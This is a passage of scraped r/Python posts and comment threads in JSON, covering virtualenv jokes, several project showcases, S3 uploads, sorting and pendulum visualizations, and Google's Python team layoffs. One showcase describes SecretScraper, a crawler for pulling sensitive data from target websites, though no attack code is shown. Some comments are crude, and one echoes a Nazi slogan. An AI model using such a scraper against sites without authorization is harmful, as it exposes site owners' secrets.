    "post_time": "Tuesday, December 18, 2018 at 8:49:59 PM GMT+3",
    "flair_text": "",
    "post_title": "Python Virtual Environments: Extreme Advertising Edition",
    "media": [
        "https://i.redd.it/f60emy6qq2521.jpg",
        "https://preview.redd.it/f60emy6qq2521.jpg?width=640&crop=smart&auto=webp&s=35ef0cda21b0ac4f367cf217ce54b852fa1d90b7"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ase1590",
            "score": "213",
            "content": "Remember, a virtual environment a day keeps the xkcd superfund site away.",
            "replies": [
                {
                    "author": "Eelz_",
                    "score": "40",
                    "content": "Real talk though, is there any way to understand/fix what's going on in this comic? I definitely have this happening on my Mac",
                    "replies": [
                        {
                            "author": "ase1590",
                            "score": "34",
                            "content": "Start removing pip packages and clean up."
                        },
                        {
                            "author": "raddingy",
                            "score": "1",
                            "content": "Reinstall your os."
                        },
                        {
                            "author": "ManyInterests",
                            "score": "0",
                            "content": "Check out this post"
                        }
                    ]
                }
            ]
        },
        {
            "author": "SirBastian",
            "score": "109",
            "content": "IS YOUR SHITTY bin/activate SHIT SCRIPT NOT WORKING WHEN YOU RUN IT? THAT'S BECAUSE YOU NEED TO SOURCE IT DO THIS: source <myenv>/bin/activate WHY DO YOU NEED TO SOURCE SOMETHING THAT LIVES IN THE BIN DIRECTORY? BECAUSE FUCK YOU. DID SOURCING IT THROW YOU A WEIRD ERROR? YOU'RE PROBABLY USING AN UNSUPPORTED SHELL. FUCKING SHITSTACK VIRTUALENV THINKS IT SHOULD DIRECTLY TOUCH YOUR ENVIRONMENT VARIABLES USING SHELL-SPECIFIC COMMANDS, INSTEAD OF JUST OPENING A SUBSHELL LIKE A NORMAL FUCKING CITIZEN SO GO EDIT YOUR ACTIVATE SCRIPT AND IMPLEMENT THE EXACT SAME FUNCTIONALITY THAT'S ALREADY IN THERE, BUT THIS TIME IN YOUR SHELL'S SYNTAX THAT'S IT. THANKS VIRTUALENV NOW KILL YOUR SHELL BECAUSE YOU ALREADY SOURCED THAT SCRIPT AND YOU NEED TO REFRESH IT RE-OPEN IT. NOW JUST REPEAT FOR EVERY OTHER VIRTUALENV YOU EVER MAKE, FOREVER OK ITS TIME TO EDIT YOUR SOURCE WAIT YOU WANT TO USE SCREEN OR TMUX? LISTEN FUCK YOU OK, SO IS YOUR LINTER AND YOUR INTELLISENSE HOOKED UP TO YOUR VIRTUALENV? OK WELL THEN YOU'RE GONNA NEED TO EDIT THE PROJECT SETTINGS TO POINT TO THE VIRTUALENV VERSION OF PYTHON GOOD OK NOW WAIT WHERE DID YOU PUT IT? NO, SHIT, THAT'S A BAD PLACE TO PUT IT. YOU SHOULD HAVE PUT IT UNDER YOUR HOME DIRECTORY \"CAN'T YOU JUST MOVE IT\"?? SURE TRY virtualenv --relocatable <myenv> DID THAT WORK? HAHAHA I KNOW IT DIDN'T IDIOT JUST GIVE UP AND START OVER I CAN'T BELIEVE IDIOTS DON'T LOVE AND PRAISE VIRTUALENV THEIR LORD AND SAVIOR"
        },
        {
            "author": "thisismyfavoritename",
            "score": "37",
            "content": "What do you think of Conda envs? Awesome post."
        },
        {
            "author": "Jalarast",
            "score": "59",
            "content": "ELI5 the difference between this and pipenv"
        },
        {
            "author": "Fermi_Dirac",
            "score": "65",
            "content": "Someone gild this"
        },
        {
            "author": "Kidknudi",
            "score": "51",
            "content": "r/justlearnedthefword"
        },
        {
            "author": "tigerthelion",
            "score": "10",
            "content": "pip freeze > superfund.txt deactivate pip install -r superfund.txt oh god what have i done."
        },
        {
            "author": "Deto",
            "score": "8",
            "content": "With virtualenv, do you end up reinstalling the packages for every environment? E.g., do you end up with a copy of Pandas in every environment or does it symlink like conda?"
        },
        {
            "author": "DJ10skillz",
            "score": "7",
            "content": "Make a video version. Get the flext tape guy to do it."
        },
        {
            "author": "maxido",
            "score": "6",
            "content": "Not on debian, because they don't package it with python itself :( You need to install python3-venv there"
        }
    ]
},
{
    "post_author": "Old-Manufacturer6209",
    "post_id": "1cfmoye",
    "post_score": "4",
    "post_time": "Monday, April 29, 2024 at 4:19:05 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a Python CLI Tools for Competitive Programming",
    "media": [
        "https://github.com/JeanExtreme002/FastSnake",
        "https://pypi.org/project/FastSnake/"
    ],
    "post_content": "Source Code: https://github.com/JeanExtreme002/FastSnake\nPyPI: https://pypi.org/project/FastSnake/\nWhat My Project Does\nFastSnake is a command-line tool that allows you to easily create, expand, run, and test Python solutions for competitive programming problems. 🐍🏁\nThis project provides useful CLI tools for competitive programming, such as test case generators, algorithms and data structures, tools for platforms Codeforces and AtCoder, and other features that assist you during the development and testing of solutions, besides building a nice directory structure to develop your solutions. 🤓\nTarget Audience\nThis project was developed for programming competitors, focusing on users of CodeForces and AtCoder, who need to quickly develop solutions for complex problems\nComparison\nThere is no project currently doing this same thing.\nHow to Install\nJust type the following commands:\n$ pip install fastsnake\n$ fastsnake -v\nDocumentation\nExplore the documentation of FastSnake package at repository's project.",
    "comments": []
},
{
    "post_author": "tylersavery",
    "post_id": "1ciiim4",
    "post_score": "5",
    "post_time": "Thursday, May 2, 2024 at 6:28:04 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Multipart File Uploads to S3 with Python",
    "media": [
        "https://www.youtube.com/watch?v=HkF3_GLVKEg"
    ],
    "post_content": "I created this tutorial after overcoming a difficult challenge myself: uploading 5GB+ files to AWS. This approach allows the browser to securely upload directly to an S3 bucket without the file having to travel through the backend server. The implementation is written in python (backend) and vanilla js (frontend).",
    "comments": [
        {
            "author": "FailedPlansOfMars",
            "score": "3",
            "content": "This is a great bit of work, Ive hit this problem quite a few times and having the web browser upload multipart with a self signed url was the least friction to the user. Will bookmark this and see if I can use it in the future.",
            "replies": [
                {
                    "author": "tylersavery",
                    "score": "1",
                    "content": "Thanks! 🙏"
                }
            ]
        },
        {
            "author": "riksi",
            "score": "2",
            "content": "You might also need a \"list chunks\", for when you want to resume an upload. And \"abort upload\" for when you want to abort it. A nice library for the frontend is also https://github.com/transloadit/uppy",
            "replies": [
                {
                    "author": "tylersavery",
                    "score": "1",
                    "content": "Yes, there’s a lot more you can do (for example, progress bar) but was trying to keep this video as short as possible and it is not very short lol."
                }
            ]
        },
        {
            "author": "ThatSituation9908",
            "score": "1",
            "content": "Did the AWS CLI not perform well? Just curious why you went with this route.",
            "replies": [
                {
                    "author": "tylersavery",
                    "score": "1",
                    "content": "This is meant to be used for a web app to allow other users to upload files - not for myself to upload files."
                }
            ]
        }
    ]
},
{
    "post_author": "thebuffed",
    "post_id": "eluz97",
    "post_score": "2076",
    "post_time": "Wednesday, January 8, 2020 at 7:28:15 PM GMT+3",
    "flair_text": "",
    "post_title": "Visualizing Bubble Sort",
    "media": [
        "https://preview.redd.it/r1rr66rzzk941.png?width=640&crop=smart&auto=webp&s=60ab9f7b57bfbcc82e529781bf759cd8a7313ace",
        "https://i.redd.it/r1rr66rzzk941.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "YuriSpiridonov",
            "score": "119",
            "content": "r/dataisbeautiful",
            "replies": [
                {
                    "author": "kokoseij",
                    "score": "29",
                    "content": "Why the fuck is this a thing I'm in",
                    "replies": [
                        {
                            "author": "SNova96",
                            "score": "28",
                            "content": "Why not ?"
                        },
                        {
                            "author": "monstimal",
                            "score": "19",
                            "content": "Prepare for politics is ugly instead."
                        },
                        {
                            "author": "wobuxihuanbaichi",
                            "score": "3",
                            "content": "You son of a bitch."
                        },
                        {
                            "author": "FleetAdmiralFader",
                            "score": "1",
                            "content": "There is also r/dataisugly Many of them are really bad but the questionable ones are a good exercise in both critiquing and defending a visualization."
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "68",
            "content": "whoa, this looks interesting. can you do this for other sorting algorithms too?"
        },
        {
            "author": "thebuffed",
            "score": "48",
            "content": "You can check out the repository or a tutorial if you're interested"
        },
        {
            "author": "Milumet",
            "score": "20",
            "content": "Nice, but not as cool as this."
        },
        {
            "author": "zapatasblood",
            "score": "16",
            "content": "I think you need one more column on the left. The first movement is not shown. Really cool visualization though."
        },
        {
            "author": "Xtg0X",
            "score": "11",
            "content": "Can't wait for BOGO Sort and Radix if you intend to do more of these."
        },
        {
            "author": "ThePoulpator",
            "score": "5",
            "content": "I have seen quite a bit of sorting algorithms visualization, but you really did something new, well done !"
        },
        {
            "author": "mac-0",
            "score": "3",
            "content": "Why are some lines curved and some straight?"
        },
        {
            "author": "realuduakobong",
            "score": "2",
            "content": "Someone is a Tom Scott fan :)"
        }
    ]
},
{
    "post_author": "jmreagle",
    "post_id": "1cg4st4",
    "post_score": "502",
    "post_time": "Monday, April 29, 2024 at 8:22:46 PM GMT+3",
    "flair_text": "News",
    "post_title": "Google laysoff Python maintainer team",
    "media": [
        "https://www.hindustantimes.com/business/google-layoffs-sundar-pichai-led-company-fires-entire-python-team-for-cheaper-labour-101714379453603.html"
    ],
    "post_content": "https://www.hindustantimes.com/business/google-layoffs-sundar-pichai-led-company-fires-entire-python-team-for-cheaper-labour-101714379453603.html\nAre there any ramifications for the Python community outside of Google?",
    "comments": [
        {
            "author": "Skylion007",
            "score": "184",
            "content": "pybind11 was mostly funded by this team, directly/indirectly, so we are in need of a new sponsor. I am an active maintainer of the project."
        },
        {
            "author": "riklaunim",
            "score": "271",
            "content": "AFAIK they offshored it - fired locally to hire in Germany if I recall correctly.",
            "replies": [
                {
                    "author": "vorticalbox",
                    "score": "236",
                    "content": "Google really are the wurst.",
                    "replies": [
                        {
                            "author": "riklaunim",
                            "score": "57",
                            "content": "All big companies, corporations have their oddities. Like not everyone wants to work in corpo. In Google when it comes to promotions or salary increases they have their codified system which leads to people gamifying it. When a product launch is rated highly while maintenance or bugfixing nearly at zero you will see Goglers jumping from one project to another just to have launches on their account. It doesn't matter if you do your job well on a day by day basis."
                        },
                        {
                            "author": "[deleted]",
                            "score": "58",
                            "content": "No, that is more Prussian. Bavarians (the state where Munich) is more, \"Oh it is beer o'clock, see you at the Biergarten.\" and during Oktoberfest, everything stops.",
                            "replies": [
                                {
                                    "author": "hughk",
                                    "score": "11",
                                    "content": "No, that is more Prussian. Bavarians (the state where Munich) is more, \"Oh it is beer o'clock, see you at the Biergarten.\" and during Oktoberfest, everything stops."
                                }
                            ]
                        },
                        {
                            "author": "Jim-Jones",
                            "score": "5",
                            "content": "Don't be evil has been cancelled."
                        },
                        {
                            "author": "BlackLotus8888",
                            "score": "1",
                            "content": "What else have they brat in?"
                        },
                        {
                            "author": "Whipitreelgud",
                            "score": "1",
                            "content": "Fuckin brats"
                        },
                        {
                            "author": "FunnyMathematician77",
                            "score": "-1",
                            "content": "I guess their work set them free"
                        }
                    ]
                }
            ]
        },
        {
            "author": "fortunatefaileur",
            "score": "204",
            "content": "Wow is that a low quality link to post. It’s sad for them, sad for Google’s sanity and ability to manage Python code and toolchains, mildly bad for Python as a whole but the world will go on. More useful links: post from the ever-excellent yhg1s: https://social.coop/@Yhg1s/112332127058328855 simonw meta: https://simonwillison.net/2024/Apr/27/everything-googles-python-team-were-responsible-for/ HN discussion about it: https://news.ycombinator.com/item?id=40171125 specific discussion on what they’d done: https://news.ycombinator.com/item?id=40176338"
        },
        {
            "author": "thomas_blanky",
            "score": "106",
            "content": "This is what happens when you have an ex-Mckinsey as a CEO"
        },
        {
            "author": "crawl_dht",
            "score": "192",
            "content": "Big tech overhires and then overfires when they feel vulnerable. They have hired cheaper developers from Germany to cut down the cost. If these companies were really so critical about cost of paying salary a little too much, then they would be giving work from home permanently to save their operational cost of offices but instead they force employees to come to office by burning fuel and then preach about saving climate.",
            "replies": [
                {
                    "author": "inspectoroverthemine",
                    "score": "72",
                    "content": "feel vulnerable ie: when their margins might fall below 55%"
                }
            ]
        },
        {
            "author": "coderanger",
            "score": "75",
            "content": "Just to be clear this was their internal Python platform support team, not related to Python as a project.",
            "replies": [
                {
                    "author": "catcint0s",
                    "score": "67",
                    "content": "Several of us were/are/TBD also involved in both long term strategic leadership and maintenance of the open source CPython project itself. That direct feedback line from a major diverse needs user into the project and ecosystem was valuable for the world. there is a bit"
                },
                {
                    "author": "ZeeBeeblebrox",
                    "score": "24",
                    "content": "This is mostly true but there was at least one core Python maintainer on the team."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1ciuske",
    "post_score": "1",
    "post_time": "Friday, May 3, 2024 at 3:00:50 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "MrAstroThomas",
    "post_id": "1cfbezg",
    "post_score": "13",
    "post_time": "Sunday, April 28, 2024 at 8:10:44 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Meteor Science using Python - Creating a \"weird\" coordinate system",
    "media": [
        "https://www.nasa.gov/meteoroid-environment-office/sporadic-meteoroid-environment/",
        "https://youtu.be/C61lybno5-A",
        "https://github.com/ThomasAlbin/Astroniz-YT-Tutorials/blob/main/Project-Meteor-Science/5_rotating_earth.ipynb",
        "https://github.com/ThomasAlbin/Astroniz-YT-Tutorials",
        "https://skyandtelescope.org/astronomy-blogs/explore-night-bob-king/random-meteors-arent-random02112015/",
        "https://www.youtube.com/c/Astroniz"
    ],
    "post_content": "Hey everyone,\nI am creating \"Space Science with Python\" tutorials on YouTube with free and open accessible Python code on GitHub. It is not fancy or a \"super high animation quality YouTube production\". I am just an astrophysicists (what a difficult word to write), working in industry who continues with science as a hobby. Ha! And I have some crazy niche knowledge that is not covered by Gemini or chatGPT (yet).\nAnyway, I am creating now a tutorial on meteor science and wanted to show you how to create a coordinate system that co-rotates with the Earth while it is revolving around the Sun.\nWhy is this interesting?\nWell, you may have heard about certain meteor streams like the Perseids in August or the Geminids in December. Dedicated streams that are associated with e.g. a particular comet or asteroid. However there are meteors that appear \"random\". So called sporadics. These sporadics have certain source regions, like e.g. the Apex.\nCool, what the heck is an Apex?\nThe Apex is Earth's \"flight direction\" in the Solar System. Imagine viewing the Sun and Earth from top of the Solar System: Apex is rotating with the Earth. Thus, it is not a fixed coordinate system. Take this image from Sky & Telescope that helps you imaging this stuff.\nNow the resulting regions of interests can be seen on this NASA page. In a sky map / plot you see different sources.\n...but wouldn't it be cool to do it yourself? With your own data and Python code?\nAnd that's where I try to jump in. Check out the code and the corresponding video.\nI am looking forward to any feedback / comment",
    "comments": [
        {
            "author": "nbviewerbot",
            "score": "4",
            "content": "I see you've posted a GitHub link to a Jupyter Notebook! GitHub doesn't render large Jupyter Notebooks, so just in case, here is an nbviewer link to the notebook: https://nbviewer.jupyter.org/url/github.com/ThomasAlbin/Astroniz-YT-Tutorials/blob/main/Project-Meteor-Science/5_rotating_earth.ipynb Want to run the code yourself? Here is a binder link to start your own Jupyter server and try it out! https://mybinder.org/v2/gh/ThomasAlbin/Astroniz-YT-Tutorials/main?filepath=Project-Meteor-Science%2F5_rotating_earth.ipynb I am a bot. Feedback | GitHub | Author"
        },
        {
            "author": "arden13",
            "score": "3",
            "content": "It is not clear what the figure made at the end is attempting to show. Additionally you invoke a package, spicepy, which is clearly important for the primary calculation of the notebook. I would recommend using markdown cells to explain what you're trying to accomplish and how to interpret your results. Additionally explain some of what spicepy is doing or why you chose the various kernels you did.",
            "replies": [
                {
                    "author": "MrAstroThomas",
                    "score": "1",
                    "content": "Thanks for your feedback! Currently I try to create a tutorial series, where several videos + the corresponding code build up on each other. However I agree that after some time, if one did not watch everything from the beginning, things become unclear and unstructured. I need to find a better way.",
                    "replies": [
                        {
                            "author": "arden13",
                            "score": "1",
                            "content": "I didn't bother with the video, so I can't comment on it. Simply discussing the code",
                            "replies": [
                                {
                                    "author": "MrAstroThomas",
                                    "score": "1",
                                    "content": "Ah ok :). Yeah creating more sophisticated Markdowns in Jupyter isn't a problem. Thanks!"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "OH-YEAH",
            "score": "2",
            "content": "This sounds awesome!"
        }
    ]
},
{
    "post_author": "Mental-Elephant-6215",
    "post_id": "1cgx1qp",
    "post_score": "6",
    "post_time": "Tuesday, April 30, 2024 at 7:26:08 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "pyrseus - concurrent.futures extensions for easier troubleshooting",
    "media": [
        "https://pyrseus.readthedocs.io/en/latest/",
        "https://github.com/dalleyg/pyrseus"
    ],
    "post_content": "https://github.com/dalleyg/pyrseus\nWhat My Project Does\nPyrseus extends Python’s concurrent.futures asynchronous and concurrent programming package with:\na collection of non-concurrent executors for light workloads and troubleshooting,\nExecutorCtx, a factory for easily switching between different executors, and\na collection of ready-built ExecutorCtx plugins, supporting executors from concurrent.futures, ipyparallel, loky, mpi4py, and itself. Where relevant, optional cloudpickle-enhanced plugins are also provided.\nFull documentation is available at https://pyrseus.readthedocs.io/en/latest/.\nTarget Audience\nPython developers who already use concurrent.futures that want at least one of the following:\nan easier way to troubleshoot problems with their tasks without having to rewrite the control code,\nan easier way to switch between concurrent and non-concurrent execution without having to rewrite the control code, and/or\nan easier way to dynamically change what executor class is used at runtime.\nComparison\nInlineExecutor is similar to various open source classes that already exist, but almost always as internal implementation details in much larger projects.\nNoCatchExecutor is a less common class in other libraries, since it intentionally has non-standard error handling. We include it because it can be useful in situations where one wants true fail-fast behavior.\nWe're not aware of the other pickle-testing serial executors existing elsewhere.\nExecutorCtx ties together the executors provided by Pyrseus. We're not aware of any open source libraries that support (a) both serial and concurrent executors, and (b) do so as a standalone package instead of as part of a much larger package.\nIt's worth giving special mention to the loky project. It provides (a) a better version of concurrent.futures.ProcessPoolExecutor and (b) a reusable executor factory. Pyrseus can use loky's executors as backends, if it's installed. Our package extends loky by making its reusable executors usable as context managers. We also supply non-concurrent executors and make it easy to switch to them at runtime, as discussed above.\nSee the notebooks and the plugins list at https://pyrseus.readthedocs.io/en/latest/ for more details.",
    "comments": [
        {
            "author": "theng",
            "score": "0",
            "content": "Hello this project looks cool (although I didn't check the code nor tested it) the other day I used the future threadpoolexecutor map and I struggled with exception management (without it to become cucumbersome) so my question is : Are exceptions easy to handle? I didn't see any example with a comparison between your module and without. I think it could add value. peace",
            "replies": [
                {
                    "author": "Mental-Elephant-6215",
                    "score": "2",
                    "content": "Thanks for your comment. I assume the trouble you were having was with an exception in the code you submitted to the ThreadPoolExecutor, not a problem with the executor itself. Try taking a look at the following notebook in the documentation: https://pyrseus.readthedocs.io/en/latest/notebooks/debugging_example.html. It's focused on troubleshooting pickling problems with ProcessPoolExecutor, but it walks through many different ways of troubleshooting. For your particular case, you could replace your ThreadPoolExecutor with an InlineExecutor or NoCatchExecutor, e.g. if your current code is with ThreadPoolExecutor(8) as exe: results = exe.map(my_buggy_function, my_inputs) Then you could try running the following instead under a debugger like ipdb: with NoCatchExecutor() as exe: results = exe.map(my_buggy_function, my_inputs) Or alternatively, you could use ExecutorCtx: with ExecutorCtx(\"nocatch\") as exe: results = exe.map(my_buggy_function, my_inputs)"
                }
            ]
        }
    ]
},
{
    "post_author": "PadishahIII",
    "post_id": "1cfa97o",
    "post_score": "13",
    "post_time": "Sunday, April 28, 2024 at 7:21:04 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "SecretScraper: highly configurable web crawler/scraper for extracting sensitive data from websites",
    "media": [
        "https://github.com/GerbenJavado/LinkFinder",
        "https://github.com/PadishahIII/SecretScraper"
    ],
    "post_content": "Hi, I'm a cybersecurity enthusiastic. And I've made a web crawler/scraper tool to extract links and sensitive information against target websites. You can find it here: https://github.com/PadishahIII/SecretScraper.\nWhat My Project Does SecretScraper is a highly configurable web scraper tool that crawls links, extracts subdomains from target websites and finds sensitive data using regular expressions. The features included in the SecretScraper are:\nWeb crawler: extract links using both DOM hierarchy and regex\nSupport for domain whitelist and blacklist\nSupport multiple targets, enter target URLs from a file\nScalable customisation: header, proxy, timeout, cookie, scrape depth, follow redirect, etc.\nBuilt-in regex to search for sensitive information: hyperscan is employed for higher performance\nFlexible configuration in yaml format\nTarget Audience SecretScraper is made for penetration tester or web developer who can use this tool for info-gathering and finding any sensitive data or route of any website.\nComparison A similar project is LinkFinder, an awesome python script written to discover endpoints and their parameters in JavaScript files. But I was expecting a project with more general use and more functionality. So I am developing this project half for practice and half with the intension of integrating it in a larger design.\nUse Case There is full documentation available in Github: https://github.com/PadishahIII/SecretScraper. Simply install via pip install secretscraper and see secretscraper --help.",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1ciuske",
    "post_score": "1",
    "post_time": "Friday, May 3, 2024 at 3:00:50 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "TheTerrasque",
    "post_id": "1chhm8x",
    "post_score": "22",
    "post_time": "Wednesday, May 1, 2024 at 12:11:56 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ConfigClass - simple dataclass inspired configuration",
    "media": [
        "https://github.com/TheTerrasque/python-configclass"
    ],
    "post_content": "What My Project Does\nI'm making a simple configclass for handling configuration in smaller projects and scripts. Goal is to be as simple to start with as creating a dataclass.\nThe module itself works off dataclass and when you use it you just define a dataclass as normal, but decorate it with @configclass() instead.\nExample:\nfrom configclass import configclass\n\n@configclass()\nclass Settings:\n    foo: bool = False\n    url: str = \"\"\n    footoo: bool = True\n    my_model: str = \"model.pt\"\n\nsetting = Settings.load()\n\nprint(setting.foo, setting.footoo, setting.my_model)\nFrom that you got\nJSON config file support (config.json)\nYAML config file support (config.yaml)\nCommand line support (argparse)\nEnv variables support (CONFIG_SETTINGNAME)\nIt also support nested structures via nested dataclass classes.\nComparison\nIt's meant as a quick and lightweight alternative to larger and more comprehensive config systems, for the small programs and scripts where you'd just use a dataclass, and maybe load the values from a config file.\nTarget Audience\nSince it's pretty new and raw I wouldn't recommend it for heavy production settings or complex projects. That said, it should work fine for most cases.\nWhile I've worked with python for quite some time, this is the first time I've tried making a package, so I'd like some feedback on the project and it's structure before I push it anywhere. It'd also be nice to stress test it and shake out some bugs.\nMore info and code at https://github.com/TheTerrasque/python-configclass",
    "comments": [
        {
            "author": "Intelligent_Ad_8148",
            "score": "11",
            "content": "What are the benefits of using this over pydantic (which also has dataclasses, json/yaml conversion, and env var support)?",
            "replies": [
                {
                    "author": "TheTerrasque",
                    "score": "4",
                    "content": "pydantic-settings is very nice, true. This aims to be even simpler, somewhere in between of using pydantic and nothing, and be a drop-in replacement for a dataclass config. Also, this provides command line argument parsing and loading from file configs by default, without any extra setup."
                }
            ]
        },
        {
            "author": "BossOfTheGame",
            "score": "4",
            "content": "I've written something similar, which is now a fairly mature project. If you want to take a look, I'm open to contributions if you have any ideas that might improve scriptconfig The main difference in a scriptconfig.DataConfig is that it doesn't rely on the type system. Instead it uses wrapped values to hold metadata, which ultimately ends up being a lot more extensible and introspectable. It can also create argparse CLIs (with Rich-argparse and argcomplete integration), serialize and deserialize from yaml or JSON, be used purely as a lightweight dictionary or namespace object, and it has decent support for modal CLIs. In the future I'd like to add more support for jsonargparsre. https://pypi.org/project/scriptconfig/",
            "replies": [
                {
                    "author": "TheTerrasque",
                    "score": "1",
                    "content": "Nice! Yeah, had a similar thought. I wanted something really simple, and usually when developing my progress goes like this: TOP_LEVEL_VARIABLES Move them into a dataclass for easier collection and editor completion Load from a file as I want some things out of GIT or want to experiment with different settings more quickly. Add command line for some parts because when developing and rapidly testing things changing options on a command line is super simple and straight forward. Want to deploy on docker or kubernetes and starting to read env vars. So after going down that path multiple times I just wanted to have something super simple that wrapped that path from the start, while being no more work than writing a dataclass. I have tried a few different ones I found via google, but it either felt too much boilerplate, or the approach was not what I was looking for. pydantic-settings is close, but I still feel it's a tad too much boilerplate for a simple project."
                }
            ]
        },
        {
            "author": "i_can_haz_data",
            "score": "2",
            "content": "Yet another implementation of this same concept. Our approach includes automatic expansion of values ending in _env or _eval in case you need to include secrets in the co figuration file. https://github.com/glentner/cmdkit"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cfl2sg",
    "post_score": "3",
    "post_time": "Monday, April 29, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "thebuffed",
    "post_id": "eluz97",
    "post_score": "2076",
    "post_time": "Wednesday, January 8, 2020 at 7:28:15 PM GMT+3",
    "flair_text": "",
    "post_title": "Visualizing Bubble Sort",
    "media": [
        "https://preview.redd.it/r1rr66rzzk941.png?width=640&crop=smart&auto=webp&s=60ab9f7b57bfbcc82e529781bf759cd8a7313ace",
        "https://i.redd.it/r1rr66rzzk941.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "YuriSpiridonov",
            "score": "119",
            "content": "r/dataisbeautiful",
            "replies": [
                {
                    "author": "kokoseij",
                    "score": "29",
                    "content": "Why the fuck is this a thing I'm in",
                    "replies": [
                        {
                            "author": "SNova96",
                            "score": "28",
                            "content": "Why not ?"
                        },
                        {
                            "author": "monstimal",
                            "score": "19",
                            "content": "Prepare for politics is ugly instead."
                        },
                        {
                            "author": "wobuxihuanbaichi",
                            "score": "3",
                            "content": "You son of a bitch."
                        },
                        {
                            "author": "FleetAdmiralFader",
                            "score": "1",
                            "content": "There is also r/dataisugly Many of them are really bad but the questionable ones are a good exercise in both critiquing and defending a visualization."
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "68",
            "content": "whoa, this looks interesting. can you do this for other sorting algorithms too?",
            "replies": [
                {
                    "author": "thebuffed",
                    "score": "64",
                    "content": "Thanks, that's the plan!",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "21",
                            "content": "I can help once I get home."
                        }
                    ]
                }
            ]
        },
        {
            "author": "thebuffed",
            "score": "48",
            "content": "You can check out the repository or a tutorial if you're interested"
        },
        {
            "author": "Milumet",
            "score": "20",
            "content": "Nice, but not as cool as this."
        },
        {
            "author": "zapatasblood",
            "score": "16",
            "content": "I think you need one more column on the left. The first movement is not shown. Really cool visualization though."
        },
        {
            "author": "Xtg0X",
            "score": "11",
            "content": "Can't wait for BOGO Sort and Radix if you intend to do more of these."
        },
        {
            "author": "ThePoulpator",
            "score": "5",
            "content": "I have seen quite a bit of sorting algorithms visualization, but you really did something new, well done !"
        },
        {
            "author": "mac-0",
            "score": "3",
            "content": "Why are some lines curved and some straight?"
        },
        {
            "author": "realuduakobong",
            "score": "2",
            "content": "Someone is a Tom Scott fan :)"
        }
    ]
},
{
    "post_author": "MisterBlggs",
    "post_id": "ci1cg4",
    "post_score": "1995",
    "post_time": "Friday, July 26, 2019 at 1:50:24 PM GMT+3",
    "flair_text": "",
    "post_title": "Double Pendulum made with Processing.py",
    "media": [
        "https://gfycat.com/feistycompetentgarpike"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "MisterBlggs",
            "score": "100",
            "content": "I noticed Processing had an interface for Python: Processing.py. So, I figured I would try to port Daniel Shiffman from the Coding Trains Double Pendulum Code over to Python and it was ridiculously easy. I'm surprised I hadn't heard of the Python version of Processing so I figured I would share with Reddit. Python code here",
            "replies": [
                {
                    "author": "Groentekroket",
                    "score": "20",
                    "content": "Nice work! I love the style of Shiffman. I'm not learning Java(Script) but I watch most of his videos just for the flow of the programs. I would love if he did more Python tutorials though.",
                    "replies": [
                        {
                            "author": "explodes",
                            "score": "4",
                            "content": "I agree. The programs are always fun and he teaches them really well."
                        },
                        {
                            "author": "MisterBlggs",
                            "score": "4",
                            "content": "Same here I really wish we had a python equivalent to him, but I still learn so much from him even though I don't really know JavaScript or Java."
                        }
                    ]
                },
                {
                    "author": "ivosaurus",
                    "score": "8",
                    "content": "Ever so slightly sad that you have to write python 2.7 code for processing's Jython :/"
                },
                {
                    "author": "SuperRokas",
                    "score": "2",
                    "content": "I love Daniel Shiffman.",
                    "replies": [
                        {
                            "author": "MisterBlggs",
                            "score": "2",
                            "content": "Definitely my favorite programmer to watch. We just need to convince him to do some Python."
                        }
                    ]
                }
            ]
        },
        {
            "author": "piotrulu",
            "score": "75",
            "content": "Or as I like to call it: flower petals generator. Good job my man."
        },
        {
            "author": "JackdeAlltrades",
            "score": "27",
            "content": "r/gifsthatendtoosoon"
        },
        {
            "author": "pa7x1",
            "score": "15",
            "content": "Very cool! If you are interested you could do some simulations to measure the Lyapunov exponent that demonstrate the chaotic behavior of the double pendulum. Select a starting point and fix a simulation time (the longer the better but keep it manageable for your computation). Simulate the double pendulum and record its position at time t. Then rinse and repeat with slight changes of the initial conditions. You should observe that very small changes of the initial conditions result in very different positions at time t."
        },
        {
            "author": "bluemerilin",
            "score": "10",
            "content": "That’s pretty cool. It looks like it’s a cross section of it drawing in 3D"
        },
        {
            "author": "ThortheAssGuardian",
            "score": "9",
            "content": "Very cool. Makes me wonder if you could model such a pendulum in 3D and use the line tracing as a model for a crazy looking 3D printed fruit bowl."
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "r/oddlysatisfying"
        },
        {
            "author": "porcelain_robots",
            "score": "4",
            "content": "Can you ELI5 how the bottom part can swing higher than its orginial release point? What's the physics behind this?"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Huge fan of processing.org. I used it in college in my art degree over a decade ago. Super excited to play with this, thanks for sharing!"
        },
        {
            "author": "poditoo",
            "score": "3",
            "content": "I am the only one who gets too excited when the second pendulum makes a full loop? It's like watching soccer, you see the angle of attack is right, the speed seems ok and it's getting close and SCOOOOOOOOOOORE. Edit oh and none of the players are overpaid."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cestbe",
    "post_score": "5",
